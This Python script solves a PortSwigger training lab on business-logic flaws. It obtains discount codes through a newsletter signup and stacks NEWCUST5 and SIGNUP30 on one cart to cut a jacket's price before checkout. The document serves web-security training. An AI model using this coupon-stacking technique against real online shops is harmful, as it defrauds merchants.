# Lab 04 — Flawed enforcement of business rules
# PortSwigger: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules
#
# Vulnerability: Two separate discount codes (NEWCUST5 from the homepage,
#                SIGNUP30 from the newsletter signup) can BOTH be applied
#                to the same cart — only reusing the SAME code is blocked
# Aim:           Buy the "Lightweight l33t leather jacket" for free by
#                stacking discount codes
#
# Technique:
#   Apply NEWCUST5, then apply SIGNUP30 to the same order. Neither is
#   individually reused, so both stack. If further discount codes can be
#   discovered/generated, keep applying different ones until price hits $0.
#
# Usage: python business_logic_lab04.py <url>

import sys
import urllib3
from proxies import proxies
from business_logic_utils import (banner, section, make_session, login,
                                   find_product_id, add_to_cart, get_cart_total,
                                   get_csrf_from_response, check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 04 — FLAWED ENFORCEMENT OF BUSINESS RULES (COUPON STACKING)")

    if len(sys.argv) != 2:
        print("  Usage: python business_logic_lab04.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: add the jacket to the cart ────────────────────────────────────
    print("\n  ── Step 1: add the leather jacket to the cart\n")
    product_id = find_product_id(session, url)
    add_to_cart(session, url, product_id, quantity=1)

    total_before = get_cart_total(session, url)
    print_box("Cart total before discounts", f"${total_before}")

    # ── Step 2: sign up for the newsletter to get SIGNUP30 ────────────────────
    print("\n  ── Step 2: sign up for the newsletter to obtain the SIGNUP30 code\n")
    home_page = session.get(url)
    csrf = get_csrf_from_response(home_page.text)

    newsletter_data = {"email": "attacker@example.com"}
    if csrf:
        newsletter_data["csrf"] = csrf

    r_newsletter = session.post(f"{url}/subscribe", data=newsletter_data)
    print(f"  ℹ  Newsletter signup status: {r_newsletter.status_code}")
    print_box("Newsletter signup response (look for a coupon code)", r_newsletter.text[:400])

    # ── Step 3: apply the homepage discount NEWCUST5 ───────────────────────────
    print("\n  ── Step 3: apply NEWCUST5 (homepage discount code)\n")
    r_coupon1 = session.post(f"{url}/cart/coupon", data={"coupon": "NEWCUST5"})
    check_status(r_coupon1, [200, 302], "Apply NEWCUST5")

    total_after_first = get_cart_total(session, url)
    print_box("Cart total after NEWCUST5", f"${total_after_first}")

    # ── Step 4: apply SIGNUP30 (newsletter reward) ─────────────────────────────
    print("\n  ── Step 4: apply SIGNUP30 (newsletter signup reward)\n")
    r_coupon2 = session.post(f"{url}/cart/coupon", data={"coupon": "SIGNUP30"})
    check_status(r_coupon2, [200, 302], "Apply SIGNUP30")

    total_after_second = get_cart_total(session, url)
    print_box("Cart total after stacking both codes", f"${total_after_second}")

    # ── Step 5: checkout ────────────────────────────────────────────────────────
    print("\n  ── Step 5: place the order\n")
    r_checkout = session.post(f"{url}/cart/checkout")
    check_status(r_checkout, [200, 302], "Checkout")

    print()
    print("  ℹ  Reusing the SAME coupon code twice is correctly blocked —")
    print("     but nothing stops two DIFFERENT codes from stacking on the")
    print("     same order. If the total isn't $0 yet, look for additional")
    print("     discount sources (other newsletter variants, referral codes).")
